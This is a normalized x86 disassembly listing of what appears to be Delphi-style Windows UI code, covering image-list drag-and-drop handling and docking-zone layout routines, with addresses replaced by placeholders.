mov eax [ eax ]
call sub_452428
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_422b8c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_43ccf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_441a24
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43cd50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_4418e8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_43cc24
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_43cdb0
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_43ccf0
push 0x0
call ShowCursor
sub_43cdb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_4418e8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_43ce14
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cbe4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43ce14
push ebx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_43ce38
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_43cbe4
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43ceac
push ebx
push esi
mov esi eax
mov eax esi
call sub_4418e8
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_43ce14
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_43cd38
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43cef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_436fbc
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d644
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43366c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_43cf50
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4370e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_43cfa0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d948
xor eax eax
push ebp
push sub_43d03e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41dc3c
xor eax eax
push ebp
push sub_43d01b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_433684
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d022
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41dc3c
retn
sub_43d050
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43d0e4
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_43d06c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43d0e4
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_43d6dc
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_43d0e4
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_43d118
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43d1a8
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov edx 0x2
call sub_43d1a8
jmp r-xdata
retn
sub_43d160
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43d214
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov edx 0x2
call sub_43d214
jmp r-xdata
retn
sub_43d1a8
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_43d5dc
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_43d214
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_43d0c8
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_43d5dc
push eax
mov eax esi
call sub_43d118
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_43d5dc
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_43d2c4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43d0c8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_43d6dc
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_43d214
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_43d0c8
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_43d214
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_43d118
mov edx eax
add edx esi
mov eax ebx
call sub_43d604
mov edx edi
mov eax ebx
call sub_43d604
jmp r-xdata
mov eax ebx
call sub_43d464
mov eax ebx
call sub_43d6b4
mov ebx eax
test ebx ebx
jne r-xdata
sub_43d36c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403eb4
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f08
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
sub_43d3b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_4032f4
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_43d421
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4357a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_43d434
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_43d6b4
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_43d464
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43d214
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43d214
mov esi eax
push ebp
call sub_43d434
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d6b4
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43d1a8
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43d1a8
mov ecx ebx
pop edx
call sub_4125e8
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434450
mov eax [ ebp - 0x4 ]
call sub_43d5dc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_43d5dc
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d5dc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_43d5dc
push ebx
mov ebx eax
mov eax ebx
call sub_43d0e4
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_43d06c
test al al
je r-xdata
mov eax ebx
call sub_43d118
pop ebx
retn
sub_43d618
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d604
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43d0b4
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_43d608
mov edx esi
call sub_43d618
sub_43d654
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43d5dc
mov edi eax
mov eax ebx
call sub_43d118
cmp edi eax
jl r-xdata
mov eax esi
call sub_43d2c4
mov eax [ esi + 0x1c ]
push eax
push sub_43f164
mov edx esi
call sub_43d990
mov eax ebx
call sub_43d5dc
mov edi eax
mov eax esi
call sub_43d160
cmp edi eax
jle r-xdata
mov eax ebx
call sub_43d654
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_43d6c0
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43d0e4
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_43d6e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030c8
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403404
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d090
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d34c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4223a0
mov edx eax
mov eax ebx
call sub_41d4c8
mov eax [ ebp - 0x4 ]
call sub_43d8b8
xor eax eax
push ebp
push sub_43d7f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_437fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_43d2c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d7fb
mov eax [ ebp - 0x4 ]
call sub_43d8bc
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_437f84
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_43d7fb
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_43f68c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_43d850
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_43e8bc
mov eax [ esi + 0x10 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_43d8d0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_43d8d0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_43d8d0
pop ecx
sub_43d928
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_43d8d0
pop ecx
sub_43d954
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43d954
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43d954
pop ecx
sub_43d9a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_43d928
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43d214
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_43d214
push eax
mov edx 0x1
mov eax ebx
call sub_43d1a8
push eax
mov edx 0x2
mov eax ebx
call sub_43d1a8
pop edx
pop ecx
call sub_4125e8
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b04
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43da2c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_43d464
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_4125e8
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434450
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d090
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_43d928
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_43d0b4
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_43e954
mov edx esi
mov eax ebx
call sub_43d928
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_434a34
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d090
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_434a20
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_43d214
mov edx eax
mov eax edi
call sub_43d604
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_43d214
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_43d214
mov edx eax
mov eax edi
call sub_43d604
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_43d214
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_43dc3c
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_43dde4
jmp r-xdata
sub_43dc3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d090
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_43d5dc
mov edx eax
mov eax ebx
call sub_43d604
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_43d604
mov eax [ esi + 0x64 ]
call sub_43d5dc
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_43ecac
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43d990
mov eax [ esi + 0x64 ]
call sub_43d5dc
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
